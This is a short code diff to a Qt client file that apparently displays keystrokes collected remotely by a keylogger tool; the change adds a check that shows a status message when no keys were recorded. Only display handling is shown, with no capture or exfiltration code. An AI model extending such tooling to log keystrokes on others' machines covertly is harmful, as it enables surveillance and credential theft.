@@ -149,6 +149,12 @@ void KeyloggerPage::handleResponse(const Packet& packet)
     }
     else if (command == Protocol::GET_KEYLOGGER_DATA)
     {
+        if (data == "(No keys recorded)")
+        {
+            statusLabel->setText(data);
+            return;
+        }
+
         // Real-time: xử lý từng ký tự, bao gồm backspace từ IME
         textDisplay->moveCursor(QTextCursor::End);
 
